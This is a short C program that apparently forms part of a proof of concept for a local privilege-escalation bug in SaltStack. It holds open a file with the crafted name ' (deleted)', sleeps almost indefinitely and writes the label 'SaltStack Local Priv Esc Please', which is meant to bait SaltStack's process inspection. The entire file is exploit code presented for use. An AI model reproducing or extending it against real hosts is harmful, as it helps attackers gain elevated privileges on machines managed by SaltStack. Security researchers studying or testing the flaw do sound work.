#include <stdio.h>
#include <unistd.h>

void main() {
  FILE *fp = fopen (" (deleted)", "w+");
  sleep(9999999);
  fprintf(fp, "1 SaltStack Local Priv Esc Please");
  fclose(fp);
}
